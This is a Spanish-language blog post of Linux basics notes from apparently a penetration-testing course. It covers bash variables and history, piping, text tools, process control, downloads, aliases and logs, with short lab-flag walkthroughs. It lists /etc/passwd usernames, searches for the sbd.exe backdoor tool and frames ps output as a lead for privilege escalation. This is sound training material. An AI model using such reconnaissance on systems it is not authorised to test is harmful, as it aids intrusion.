---
layout: post
title: Linux
subtitle: Linux Basics.
tags: [pen]
---
### 1. El entorno de Bash.

Bash es una shell (entorno de linea de comandos) compatible con 'sh' que nos permite ejecutar comandos complejos y realizar distintas tareas desde una terminal. Bash concretamente junta característiacs de KornShell y C shell.

<br />

#### 1.1. Variables de Entorno.

**Definición**

Las *variables de entorno* son un conjunto de valores almacenados en variables que acompañan a un entorno de línea de comandos, una terminal. Estas se utilizan como una manera de almacenar una configuración global necesaria para cualquier programa que se corra en la terminal.

<br />

**Variables de entorno comúnes**

Para ver todas las variables de entorno disponibles, tenemos el término 'env':

```bash
kali@kali:~$ env
SHELL=/bin/bash
...
PWD=/home/kali
XDG_SESSION_DESKTOP=lightdm-xsession
LOGNAME=kali
XDG_SESSION_TYPE=x11
XAUTHORITY=/home/kali/.Xauthority
XDG_GREETER_DATA_DIR=/var/lib/lightdm/data/kali
HOME=/home/kali
...
TERM=xterm-256color
USER=kali
...
```

Algunas de las variables de entorno más comúnes son PATH, USER, PWD y HOME.

La más importante es la variable PATH, esta variable contiene una serie de rutas separados por dos puntos ':' que el systema utiliza para buscar el binario asociado al programa cuyo nombre introducimos en la terminal. Es decir, cuando nosotros introducimos en la terminal 'ls' esto no es más que un término que indica al sistema que debe buscar el binario ls que se debe encontrar en alguna de las rutas presentes en PATH. 

Podemos desplegar el contenido mediante:

```bash
kali@kali:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Por otra parte, las variables USER, PWD y HOME contienen respectivamente, los contenidos de qué usuario es, la localización actual del usuario y el directorio 'home' del usuario.

<br />

**Crear variables de entorno**

Podemos definir las variables de entorno con el término 'export'. El término export no sólo define la variable sino que además la vuelve accesible a cualquier subproceso que derivemos desde nuestra sesión de bash a través de la terminal.

```bash
kali@kali:~$ export b=10.11.1.220

kali@kali:~$ ping -c 2 $b
PING 10.11.1.220 (10.11.1.220) 56(84) bytes of data.
64 bytes from 10.11.1.220: icmp_seq=1 ttl=62 time=2.23 ms
64 bytes from 10.11.1.220: icmp_seq=2 ttl=62 time=1.56 ms

--- 10.11.1.220 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 1.563/1.900/2.238/0.340 ms
```

Observemos que el alcance de estas variables está limitado a la sesión de bash que tengamos en ese momento. 

```bash
kali@kali:~$ echo "$$"
1827

kali@kali:~$ var="My Var"

kali@kali:~$ echo $var
My Var

kali@kali:~$ bash
kali@kali:~$ echo "$$"
1908

kali@kali:~$ echo $var

kali@kali:~$ exi
exi

kali@kali:~$ echo $var
My Var

kali@kali:~$ export othervar="Global Var"

kali@kali:~$ echo $othervar
Global Var

kali@kali:~$ bash

kali@kali:~$ echo $othervar
Global Var

kali@kali:~$ exi
exi
```

Vemos en el ejemplo anterior que definiendo la variable con 'export' esta y su contenido trascienden a ulteriores sesiones que creamos a partir de la primera.

<br />

#### 1.2. Bash History Tricks.

Otra característica útil de Bash consiste en que guarda el historial en el fichero *.bash_history* accesible mediante en comando: *history*

```bash
kali@kali:~$ history
  1  cat /etc/lsb-release
  2  clear
  3  history
```

Estas líneas representan comandos que se han introducido con anterioridad en la sesión actual de Bash representados en orden. Estos comandos son accesibles mediante el operador '!' seguido del número de la línea. Por ejemplo:

```bash
kali@kali:~$ !1
cat /etc/lsb-release
DISTRIB_ID=Kali
DISTRIB_RELEASE=kali-rolling
DISTRIB_CODENAME=kali-rolling
DISTRIB_DESCRIPTION="Kali GNU/Linux Rolling"
```

De la misma forma '!!' ejecuta el comando inmediatamente anterior

```bash
kali@kali:~$ sudo systemctl restart apache2

kali@kali:~$ !!
sudo systemctl restart apache2
```

Por otra parte, existen dos "envvar" asociados al fichero: HISTSIZE y HISTFILESIZE.

El primero contiene el número de comandos (de líneas) que tiene el fichero y el segundo contiene la configuración del número mázimo de comandos que se guardan. Ambas pueden ser editadas según nuestras necesidades en el fichero '.bashrc' que guarda la configuración de la sesión actual de Bash.

Otra forma de navegar por el historial consiste en utilizar las flechas de dirección y utilizar la combinación Ctrl+R, esto habilitará una característica de búsqueda. Si introducimos una letra nos dará el último comando introducido que tuviera esa letra:

```bash
kali@kali:~$ [CTRL-R]c
(reverse-i-search)`ca': cat /etc/lsb-release 
```

<br />

#### 1.3. Práctica - The Bash Enviroment.

**1er Flag**

Nos logeamos a través de SSH a la máquina con las credenciales "student-lab". El enunciado nos indica que nuestra flag se encuentra enumerando las variables de entorno. Así pues, utilizamos el comando 'env' para obtener un listado de las mismas y obtener nuestra flag:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221204161934.png' | relative_url }}" text-align="center"/>
</div>

<br />

**2da Flag**

De nuevo nos logeamos, y el enunciado nos dice que podemos encontrar nuestra flag al final de un directorio, acudimos a el completado cada vez con TAB y obtenemos nuestra flag:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221204164006.png' | relative_url }}" text-align="center"/>
</div>

<br />

**3er Flag**

Nos logeamos y el enunciado nos incita a repasar el historial, de forma que lo hacemos y vemos un comando sospechoso. Al reproducirlo obtenemos el flag:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221204164856.png' | relative_url }}" text-align="center"/>
</div>

<br />

### 2. Piping & Redirection.

Cualquier programa que se ejecute desde un entorno de línea de comandos tiene tres canales de comunicación:

| STREAM NAME | DESCRIPCIÓN |
| - | - |
| Standard Input (STDIN) | Input del programa (teclado por defecto)|
| Standard Output (STDOUT) | Output del programa (terminal por defecto) |
| Standard Error (STDERR) | Mensajes de error (terminal por defecto) |

Estos canales definen la dirección de entrada y salida de información del programa. 

La dirección de estos canales puede ser manipulada a través de dos tipos de técnicas conocidas como *piping* y *redirection*.

<br />

#### 2.1. Redirecting to a file.

Con el operador 'redirección' (>) podemos enviar el STDOUT como el STDERR de un programa sobre un fichero. (Debemos recordar que esto no sólo incluye ficheros convencionales si no cualquier cosa ya que Linux entiende todo como un fichero del que lee datos o sobre el que escribe contenido).

Así por ejemplo:

```bash
kali@kali:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos

kali@kali:~$ echo "test"
test

kali@kali:~$ echo "test" > redirection_test.txt

kali@kali:~$ ls 
Desktop  Documents  Downloads  Music  Pictures  Public  redirection_test.txt  Template

kali@kali:~$ cat redirection_test.txt
test

kali@kali:~$ echo "Kali Linux is an open source project" > redirection_test.txt

kali@kali:~$ cat redirection_test.txt
Kali Linux is an open source projec
```

En el comando anterior podemos ver como desviamos el output de un comando sobre un fichero que antes no existía mediante el redirector '>'. El fichero se ha creado con el output del comando. Si el fichero ya existía previamente, se borrará su contenido y se sustituirá por el output del programa.

<br />

#### 2.2. Redirecting from a file.

Por otro lado, la operación inversa también puede efectuarse con el redirector inverso (<). Podemos introducir el contenido de un fichero como input de un comando:

```bash
kali@kali:~$ wc -m < redirection_test.txt 
89
```

<br />

#### 2.3. Redirecting STDERR. File descriptors.

Asociados al los canales de transmisión de datos se encuentran los 'file descriptors', enteros no negativos que identifican un fichero o un proceso relacionado con un fichero. De acuerdo con el standard de POSIX, los files descriptors del STDIN, STDOUT y STDERR son respectivamente 0, 1 y 2 y pueden ser utilizados conjuntamente con los redirectores para redirigir los datastream a conveniencia.

```bash
kali@kali:~$ ls .
Desktop  Documents  Downloads  Music  Pictures  Public  redirection_test.txt  Template

kali@kali:~$ ls ./test
ls: cannot access '/test': No such file or directory

kali@kali:~$ ls ./test 2>error.txt

kali@kali:~$ cat error.txt 
ls: cannot access '/test': No such file or directory
```

Observamos en el ejemplo anterior que el fichero sólo contiene el error del mensaje anterior.

<br />

#### 2.4. Piping.

El piping es una operación que consiste en introducir el output de un comando como input en otro comando. Esto se puede realizar mediante el operador pipe '|':

```bash
kali@kali:~$ cat error.txt 
ls: cannot access '/test': No such file or directory

kali@kali:~$ cat error.txt | wc -m
53

kali@kali:~$ cat error.txt | wc -m > count.txt

kali@kali:~$ cat count.txt 
53
```


<br />

#### 2.5. Practice - Piping & Redirection.

**1er Flag**

En este caso nos informan de que existe un fichero en la máquina que contiene la copia exacta de un fichero .tar.gz que contiene un directorio que contiene ficheros que contienen nuestra flag. Así, copiamos dicho fichero a un fichero con la extensión .tar.gz y lo descomprimimos y acto seguido buscamos en los contenidos nuestra flag:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221204192412.png' | relative_url }}" text-align="center"/>
</div>

<br />

### 3. Text Searching and manipulation.

Ahora vamos a prensentar un conjunto de herramientas que nos permitirán manipular texto y efectuar búsquedas sobre ciertos desplieges de ficheros.

<br />

#### 3.1. Grep.

Grep es un programa que busca sobre ficheros de texto en base a una expresión regular dada (una instrucción compleja de búsqueda) y despliega la línea que contiene un match para el patrón dado. Un ejemplo sencillo del uso de grep sería el siguiente:

```bash
kali@kali:~$ ls -la /usr/bin | grep zip
-rwxr-xr-x  3 root root   34480 Jan 29  2017 bunzip2
-rwxr-xr-x  3 root root   34480 Jan 29  2017 bzip2
-rwxr-xr-x  1 root root   13864 Jan 29  2017 bzip2recover
-rwxr-xr-x  2 root root    2301 Mar 14  2016 gunzip
-rwxr-xr-x  1 root root  105172 Mar 14  2016 gzip
```

El comando anterior a recogido del listado todas aquellas líneas que contuvieran el término 'zip'.

<br />

#### 3.2. Sed.

Sed es un editor de texto a través de línea de comando. Es muy complejo pero a alto nivel sed realiza cambios en las líneas de texto que se le pasa como input:

```bash
kali@kali:~$ echo "I need to try hard" | sed 's/hard/harder/'
I need to try harder
```

En el ejemplo anterior se pasa como input una linea a Sed que sustituye el término hard por harder.

<br />

#### 3.3. Cu

El comando *Cut* nos permite cortar líneas de texto en base a patrones y extraer la parte que nos interesa:

```bash
kali@kali:~$ echo "I hack binaries,web apps,mobile apps, and just about anything else"| cut -f 2 -d ","
web apps
```

El comando anterior selecciona una línea, la dividide en campos por comas y muestra por pantalla el segundo campo. Otro ejemplo sería:

```bash
kali@kali:~$ cut -d ":" -f 1 /etc/passwd
roo
daemon
bin
sys
sync
games
...
```

<br />

#### 3.4. AWK.

AWK es una herramienta que utiliza un lenguaje de programación que lleva su mismo nombre y que está diseñado para el procesamiento de texxto. De nuevo, es demasiado complicado como para ofrecer una síntesis apropiada pero un ejemplo de uso sería el siguiente:

```bash
kali@kali:~$ echo "hello::there::friend" | awk -F "::" '{print $1, $3}'
hello friend
```

El resultado se explica por sí solo. La línea queda divida en campos a partir del "::" y seguidamente se despliegan el primer y el tercer campo.

<br />

#### 3.5. Practice - Text Searching & Manipulation.

**1er Flag**

Nos logeamos y tratamos de ver qué hay en el fichero indicado. 

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221204231947.png' | relative_url }}" text-align="center"/>
</div>

Nos dicen que nuestra flag está escondida entre este texto y que probemos a obtener el decimo tercer campo, al dividirlo todo entre comas y seleccionar el 13 campo de cada línea obtenemos:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221204232044.png' | relative_url }}" text-align="center"/>
</div>


De esta forma, juntamos cada letra en la misma línea ordenando en horizontal todas las líneas y obtenemos:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221204232120.png' | relative_url }}" text-align="center"/>
</div>

<br />

**2da Flag**

En este caso nos indican un fichero que contienen muchas flags, pero que la auténtica es la más pequeña. Así, las ordenamos de menor a mayor y obtenemos la cabecera del documento:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221204232552.png' | relative_url }}" text-align="center"/>
</div>

<br />

### 4. Comparing Files

En esta sección vamos a aprender una serie de comandos que nos permiten diferenciar el contenido de diversos ficheros. 

<br />

#### 4.1. Comm.

El comando *Comm* compara dos ficheros de texto desplegando las líneas que son únicas para cada uno. El output consiste en tres columnas: en la primera se muestra las líneas únicas para el fichero del primer argumento, en la segunda se muestran las líneas únicas para el fichero del segundo argumento y la tercera despliega las líneas que ambos ficheros tienen en común:

```bash
kali@kali:~$ cat scan-a.txt
192.168.1.1
192.168.1.2
192.168.1.3
192.168.1.4
192.168.1.5

kali@kali:~$ cat scan-b.txt
192.168.1.1
192.168.1.3
192.168.1.4
192.168.1.5
192.168.1.6

kali@kali:~$ comm scan-a.txt scan-b.txt 
								192.168.1.1
192.168.1.2
								192.168.1.3
								192.168.1.4
								192.168.1.5
			  192.168.1.6
```

Aunque también se puede utilizar para que muestre sólo las líneas comunes a ambos ficheros.

```bash
kali@kali:~$ comm -12 scan-a.txt scan-b.txt
192.168.1.1
192.168.1.3
192.168.1.4
192.168.1.5
```

<br />

#### 4.2. Diff.

El comando 'Diff' tiene un propósito similar con la diferencia de que es mucho más complejo aunque también mucho más flexible. Dos de los formatos o parámetros más conocidos de Diff con '-c' (context format) y '-u' (unified format).


```diff
kali@kali:~$ diff -c scan-a.txt scan-b.txt
*** scan-a.txt	2018-02-07 14:46:21.557861848 -0700
--- scan-b.txt	2018-02-07 14:46:44.275002421 -0700
***************
*** 1,5 ****
  192.168.1.1
- 192.168.1.2
  192.168.1.3
  192.168.1.4
  192.168.1.5
--- 1,5 ----
  192.168.1.1
  192.168.1.3
  192.168.1.4
  192.168.1.5
+ 192.168.1.6
```


El context format muestra los contenidos de ambos ficheros señalando las líneas que son propias de cada uno de ellos y que no están en el homólogo. Por otra parte el unified format muestra el contenido de ambos ficheros como un sólo bloque indicando que líneas son de cada fichero:

```diff
kali@kali:~$ diff -u scan-a.txt scan-b.txt
--- scan-a.txt	2018-02-07 14:46:21.557861848 -0700
+++ scan-b.txt	2018-02-07 14:46:44.275002421 -0700
@@ -1,5 +1,5 @@
 192.168.1.1
-192.168.1.2
 192.168.1.3
 192.168.1.4
 192.168.1.5
+192.168.1.6
```

<br />

#### 4.3. Vimdiff.

Vimdiff abre vim con varias ventanas. Cada ventana abre cada fichero indicando qué lineas están o no están en según qué fichero:

```bash
kali@kali:~$ vimdiff scan-a.txt scan-b.txt
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221205105948.png' | relative_url }}" text-align="center"/>
</div>

<br />

#### 4.4. Practice - Comparing Files.

**1er Flag**

En este ejercicio en primer lugar se nos pide observar las diferencias (y sólo las diferencias) entre dos ficheros para obtener nuestra flag. Esto se puede conseguir mediante el comando; diff -d:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221205112105.png' | relative_url }}" text-align="center"/>
</div>


Así, filtramos el output para obtener nuestra flag:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221205112225.png' | relative_url }}" text-align="center"/>
</div>

<br />

### 5. Manejando Procesos.

Un proceso es una instancia de un programa siendo ejecutado por el kernel. El kernel es capaz de llevar a cabo gestión de varias tareas a través de los procesos los cuales están identificados a través de un ID (PID) un número que identifica unívocamente al proceso en cuestión.

La shell de Linux también introduce el concepto de 'job'. Un Job es el conjunto de procesos asociados al desempeño de un comando en la terminal. Por ejemplo, el siguiente comando:

```bash
cat error.txt | wc -m
```

Es una concatenación de programas que pasan su output de uno al otro y que por tanto, necesariamente va a derivar en varios procesos. El conjutno de procesos que forman parte de este comando es el job de ese comando. 

Por otra parte, asociado al concepto de *Job* está relacionado *Job Control* que alude a la habilidad de selectivamente detener, suspender o reanudar la ejecución de un Job ya sea en segundo plano o en foreground.

<br />

#### 5.1. Backgrounding Process (bg).

Que un proceso se ejecute en primer plano o en el foreground significa que el comando se ejecuta de forma que la terminal se mantiene ocupado en su procesamiento y ningún otro comando puede ser ejecutado desde dicha terminal hasta que este termine.

Para lanzar un programa o un comando a la ejecución en segundo plano existen dos métodos. El primero consiste en añadir al final de la línea que define el comando un 'ampersand': &.

```bash
kali@kali:~$ ping -c 400 localhost > ping_results.txt &
```

Otra forma consiste en suspenderlo desde la consola mediante la combinación Ctrl+Z, (no confundir con Ctrl+C que sería directamente cancelar el programa) y acto seguido continuar la ejecución en segundo plano con el comando 'bg'.


<br />

#### 5.2. Jobs Control: Jobs and fg.

Antes hemos visto una forma muy básica de gestionar comandos sin embargo una gestión más compleja y a la vez más flexible y sofisticada requiere de la introducción de dos nuevos comandos: jobs y fg.

Jobs lista los jobs que están ejecutándose en la terminal 

```bash
kali@kali:~$ ping -c 400 localhost > ping_results.txt
^Z
[1]+  Stopped                 ping -c 400 localhost > ping_results.txt

kali@kali:~$ find / -name sbd.exe
^Z
[2]+  Stopped                 find / -name sbd.exe

kali@kali:~$ jobs
[1]-  Stopped                 ping -c 400 localhost > ping_results.txt
[2]+  Stopped                 find / -name sbd.exe
```

Por otro lado, el comando 'fg' trae de vuelta a primer plano un job paralizado:

```bash
kali@kali:~$ fg %1
ping -c 400 localhost > ping_results.txt
^C

kali@kali:~$ jobs
[2]+  Stopped                 find / -name sbd.exe

kali@kali:~$ fg
find / -name sbd.exe
/usr/share/windows-resources/sbd/sbd.exe
```

El %1 se refiere al job así situado en la lista desplegada por Jobs, pero existen muchas otras formas de referirnos a los Jobs, a través del PID, a través del nombre del comando (%CommandName), al último job paralizado (%-) o al job actual (%+). 

<br />

#### 5.3. Process Control: ps and kill.

Hasta ahora hemos visto como gestionar Jobs, procesos asociados a comandos en la terminal. Sin embargo, también nos puede interesar obtener un listado general de todos los procesos que se ejecuten ya sea en la sesión de Bash como en todo el sistema.

Uno de los comandos más usados para obtener un listado de los procesos es el comando *ps*.

```bash
kali@kali:~$ ps -ef
UID         PID   PPID  C STIME TTY          TIME CMD
root          1      0  0 10:18 ?        00:00:02 /sbin/init
root          2      0  0 10:18 ?        00:00:00 [kthreadd]
root          3      2  0 10:18 ?        00:00:00 [rcu_gp]
root          4      2  0 10:18 ?        00:00:00 [rcu_par_gp]
root          5      2  0 10:18 ?        00:00:00 [kworker/0:0-events]
root          6      2  0 10:18 ?        00:00:00 [kworker/0:0H-kblockd]
root          7      2  0 10:18 ?        00:00:00 [kworker/u256:0-events_unbound
root          8      2  0 10:18 ?        00:00:00 [mm_percpu_wq]
root          9      2  0 10:18 ?        00:00:00 [ksoftirqd/0]
root         10      2  0 10:18 ?        00:00:00 [rcu_sched]
...
```

Esta se considera un estándard en cualquier sistema basado en Unix y es un comando muy útil para un pentester ya que ofrece una rápida muestra del software que está corriendo en la máquina y que eventualmente podría ser utilizado para elevar privilegios.

En la imagen anterior el comando *ps* se ha utilizado en conjunción con el parámetro '-e' que muestra todos los procesos del sistema y '-f' que despliega el formato descriptivo completo: (UID, PID, PPID, etc). Sin embargo, otro parámetro interesante puede ser '-C' que nos permite aislar la búsqueda a un nombre:

```bash
kali@kali:~$ ps -fC leafpad
UID         PID   PPID  C STIME TTY          TIME CMD
kali       1307    938  0 10:57 ?        00:00:00 leafpad
```

Por otra parte, el comando Kill nos permite terminar in proceso. Concretamente, Kill envía una seña concreta a un proceso que provoca su terminación:

```bash
kali@kali:~$ kill 1307
kali@kali:~$ ps aux | grep leafpad
kali       1313  0.0  0.0   6144   888 pts/0    S+   10:59   0:00 grep leafpad
```

<br />

#### 5.4. Practice - Managin Processes.

**1er Flag**

En este caso nos piden que ejecutemos un programa en la carpeta challenge que nos indica que debemos realizar una serie de tareas bajo su antenta mirada.

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221205180802.png' | relative_url }}" text-align="center"/>
</div>

De esta forma, mandamos el proceso a segundo plano y ejecutamos con el ampersand todos los programas dentro de la carpeta 'jobs/' y luego traemos de vuelta el programa dirty jobs con 'fg %1':


<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221205181004.png' | relative_url }}" text-align="center"/>
</div>

Después de presionar enter nos pide que terminemos todos esos procesos, sencillamente los listamos con 'jobs':

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221205181048.png' | relative_url }}" text-align="center"/>
</div>

Y con 'kill %\<numero del job\>' matamos todos los procesos de la carpeta 'jobs' y vovlemos a traer de vuelta el programa 'dirty-jobs':

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221205181339.png' | relative_url }}" text-align="center"/>
</div>

<br />

### 6. File and Command Monitoring.

#### 6.1. Head & Tail.

Cuando tenemos un documento muy largo, Head & Tail nos pueden ayudar a sacar porciones concretas respectivamente de arriba o de abajo del documento:

```bash
kali@kali:~$ sudo tail -f /var/log/apache2/access.log 
127.0.0.1 - - [02/Feb/2018:12:18:14 -0500] "GET / HTTP/1.1" 200 3380 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
127.0.0.1 - - [02/Feb/2018:12:18:14 -0500] "GET /icons/openlogo-75.png HTTP/1.1" 200 6040 "http://127.0.0.1/" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
127.0.0.1 - - [02/Feb/2018:12:18:15 -0500] "GET /favicon.ico HTTP/1.1" 404 500 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
```

<br />

#### 6.2. Watch.

El comandon *watch* se emplea para correr un determinado comando a intervalos regulares con el parámetro '-n X'. 

```bash
kali@kali:~$ watch -n 5 w

............

Every 5.0s: w                                     kali: Tue Jan 23 21:06:03 2018

 21:06:03 up 7 days,  3:54,  1 user,  load average: 0.18, 0.09, 0.03
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
kali     tty2     :0               16Jan18  7days 16:29   2.51s 
```

Este comando listará todos los comandos cada 5 segundos. 

<br />

#### 6.3 Practice - File & Command Monitoring.

En este caso tenemos un fichero que está scripteado para darnos la flag cada cierto intervalo de tiempo. Para obtener la flag debemos ejecutar dicho programa cada poco tiempo y esto lo podemos automatizar con watch. El problema es que el cambio es tan rápido que no nos da tiempo a copiarla con lo que hacemos es crear un script que ejecuta el binario y lleva el output sobre un fichero:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221205194830.png' | relative_url }}" text-align="center"/>
</div>

Y acto seguido con watch ejecutar cada poco tiempo el script desde el directorio challenge (de otra forma no se obtendrá la flag):

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221205195030.png' | relative_url }}" text-align="center"/>
</div>

Transcurrido un breve tiempo sólo tendremos que volcar el contenido del fichero con el término OS para obtener la flag:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20221205195140.png' | relative_url }}" text-align="center"/>
</div>

<br />

### 7. Downloading Files.

Vamos a ver diversas herramientas sobre cómo descargar ficheros.

<br />

#### 7.1. wget.

Wget es un comando que emplea los protocolos HTTP/S y FTP para descargar ficheros. Es frecuente emplearlo junto con el operador -O para designar un fichero de destino.

```bash
kali@kali:~$ wget -O report_wget.pdf https://www.offensive-security.com/reports/penetration-testing-sample-report-2013.pdf
--2018-01-28 20:30:04--  https://www.offensive-security.com/reports/penetration-testin
Resolving www.offensive-security.com (www.offensive-security.com)... 192.124.249.5
Connecting to www.offensive-security.com (www.offensive-security.com)|192.124.249.5|:4
HTTP request sent, awaiting response... 200 OK
Length: 27691955 (26M) [application/pdf]
Saving to: ‘report_wget.pdf’

report_wget.pdf     100%[===================>]  26.41M   766KB/s    in 28s     

2018-01-28 20:30:33 (964 KB/s) - ‘report_wget.pdf’ saved [27691955/27691955]
```


<br />

#### 7.2. Curl 

Curl es una herramienta que tiene el mismo propósito que wget pero es más flexible pues admite un conjunto de modificaciones y protocolos más amplio.

Un usuario puede emplear esta herramienta para descargar un fichero o crear requests complejas en los protocolos IMAP/S, POP3/S, SCP, SFTP, SMB/S, TELNET, TFTP entre otros.

```bash
kali@kali:~$ curl -o report.pdf https://www.offensive-security.com/reports/penetration-testing-sample-report-2013.pdf
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 26.4M  100 26.4M    0     0  1590k      0  0:00:17  0:00:17 --:--:--  870k
```

<br />

#### 7.3. Axel. 

Esta es una herramienta que permite la elaboración de peticiones complejas a través de múltiples conexiones en los protocolos FTP y HTTP. El parámetro que define cuántas conexiones establecer es '-n':

```bash
kali@kali:~$ axel -a -n 20 -o report_axel.pdf https://www.offensive-security.com/reports/penetration-testing-sample-report-2013.pdf
Initializing download: https://www.offensive-security.com/reports/penetration-testing-
File size: 27691955 bytes
Opening output file report_axel.pdf
Starting download

Connection 0 finished
Connection 1 finished
Connection 2 finished
Connection 3 finished
Connection 4 finished
Connection 5 finished
Connection 6 finished
Connection 7 finished
Connection 8 finished
Connection 9 finished
Connection 10 finished
Connection 11 finished
Connection 13 finished
Connection 14 finished
Connection 15 finished
Connection 16 finished
Connection 18 finished
[100%] [...................................................................................................................................................................] [  11.1MB/s] [00:00]

Downloaded 26.4 Megabyte in 2 seconds. (11380.17 KB/s)
```

<br />

#### 7.4. Practice - Downloading Files.

**1erFlag**

En este caso tenemos una máquina que está hosteando un servidor web en el puerto 80. Accedemos a el mediante Curl y obtenemos la flag.

<br />

### 8. Personalizando el entorno de Bash. 

Vamos a ver distintas formas de personalizar el entorno de trabajo.

<br />

#### 8.1. Bash History Customization.

Tenemos tres variables de entorno importantes: HISTCONTROL, HISTIGNORE, HISTTIMEFORMAT.

HISTCONTROL es una varibale que define si se eliminan comandos duplicados entre otras cosas. HISTIGNORE es una variable que ignora en el historial comandos que se repiten con frecuencia como ls, history, etc:

```
kali@kali:~$ export HISTIGNORE="&:ls:[bf]g:exit:history"

kali@kali:~$ mkdir test

kali@kali:~$ cd test

kali@kali:~/test$ ls

kali@kali:~/test$ pwd
/home/kali/test

kali@kali:~/test$ ls

kali@kali:~/test$ history
    1  export HISTIGNORE="&:ls:[bf]g:exit:history"
    2  mkdir test
    3  cd test
    4  pwd
```

En el ejemplo anterior se puede ver cómo en el historial no aparecen ciertos comandos especificados que tienen poca relevancia.

Por último HISTTIMEFORMAT controla el formato de salida del comando 'history' 

```bash
kali@kali:~/test$ export HISTTIMEFORMAT='%F %T '

kali@kali:~/test$ history
    1  2018-02-12 13:37:33 export HISTIGNORE="&:ls:[bf]g:exit:history"
    2  2018-02-12 13:37:38 mkdir test
    3  2018-02-12 13:37:40 cd test
    4  2018-02-12 13:37:43 pwd
    5  2018-02-12 13:37:51 export HISTTIMEFORMAT='%F %T '
```

<br />

#### 8.2. Alias. 

Un 'alias' esencialmente consiste en un string, una cadena de caracteres, que reemplaza una línea de comando. Especialmente útiles para guardar comandos largos:

```bash
kali@kali:~$ alias lsa='ls -la'

kali@kali:~$ lsa
total 8308

........
-rw-------  1 kali kali     5542 Jan 22 09:56 .bash_history
-rw-r--r--  1 kali kali     3391 Apr 25  2017 .bashrc
drwx------  9 kali kali     4096 Oct  2 21:29 .cache
```

Un aspecto de los alias con los que tenemos que tener cuidado es con el hecho de que no hay restricciones en los nombres y podemos terminar reemplazando el nombre de otro comando importante:

```bash
kali@kali:~$ alias mkdir='ping -c 1 localhost'

kali@kali:~$ mkdir
PING localhost(localhost (::1)) 56 data bytes
64 bytes from localhost (::1): icmp_seq=1 ttl=64 time=0.121 ms

--- localhost ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.121/0.121/0.121/0.000 ms
```

Es importante notar que el 'alias' es propio de la sesión de bash y no la sobrevive, en el momento en el que reiniciemos la sesión los alias definidos quedarán borrados. Es decir, son temporales.

Para deshacer un alias tenemos el término unalias:

```bash
kali@kali:~$ unalias mkdir

kali@kali:~$ mkdir
mkdir: missing operand
Try 'mkdir --help' for more information.
```

<br />

#### 8.3. Persistent Bash Customization.

Un fichero importante para la customización permanente de nuestro entorno de trabajo es el fichero ".bashrc" accesible desde nuestra carpeta personal. Este es un script que se ejecuta cada vez que el usuario se logea y que contiene configuración a modo de instrucciones en shell

```bash
kali@kali:~$ cat ~/.bashrc
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples
...
# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
HISTSIZE=1000
HISTFILESIZE=2000

# enable color support of ls and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -
    alias ls='ls --color=auto'
```

Como definición de variables o alias. De esta forma, cualquier variable o alias que se introduzca a modo de línea en este fichero se volverá un cambio permanente. 

<br />


### 9. Logs.
#### 9.1. Introducción 

Los 'logs' o registros son ficheros que proveen una lista de eventos ocurridos en el sistema ordenados de forma cronológica. Estos ficheros son útiles desde una perspectiva administrativa para registrar fallos y desde una perspectiva de la ciberseguridad ya que, a no ser que estos sean borrados, registrarán los movimientos de unos atacantes pudiendo estos ser trackeados en un análisis forense.

En linux, estos logs se guardan en el fichero /var/log. 

```bash
kali@kali:~$ ls -l /var/log
total 2544
-rw-r--r--  1 root  root     2911 Jul  7 08:33 alternatives.log
drwxr-x---  2 root  adm      4096 Jun 23 15:04 apache2
drwxr-xr-x  2 root  root     4096 Jul  7 08:31 apt
-rw-r-----  1 root  adm      5444 Jul  7 13:39 auth.log
-rw-------  1 root  root        0 Jun 25 14:39 boot.log
-rw-rw----  1 root  utmp        0 Jul  7 08:25 btmp
-rw-r-----  1 root  adm     41195 Jul  7 13:39 daemon.log
-rw-r-----  1 root  adm      1157 Jul  7 08:40 debug
-rw-r--r--  1 root  root   156531 Jul  7 08:34 dpkg.log
-rw-r--r--  1 root  root    32032 Jun 23 15:07 faillog
-rw-r--r--  1 root  root     5692 Jun 23 15:05 fontconfig.log
...
```

Muchos de estos ficheros no tienen formato y se peden leer con cualquier herramienta que muestre el contenido de un archivo (cat, tail/head, vim, etc).

Por otra parte, como estos archivos contienen información sensible está protegidos de forma que sólo alguien con permisos de superusuario puede manipularlos y por tanto requeriremos de 'sudo' para acceder a muchos de ellos:

```bash
